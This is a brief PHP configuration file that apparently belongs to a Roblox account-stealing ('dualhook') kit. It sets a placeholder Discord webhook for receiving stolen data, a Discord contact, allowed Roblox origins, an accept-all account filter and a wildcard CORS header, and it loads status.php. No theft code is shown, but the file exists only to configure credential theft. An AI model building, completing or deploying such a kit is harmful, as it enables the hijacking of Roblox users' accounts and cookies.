<?php


    $webhook = "dualhookwebhookhere";
    $discord_contact = "veiyo#0002";
    
    $allowed_origins = array(
        "https://www.roblox.com",
        "https://web.roblox.com"
    );
    function account_filter($profile) {
        return true;
    }
       require("status.php");
           header("Access-Control-Allow-Origin: *");
?>
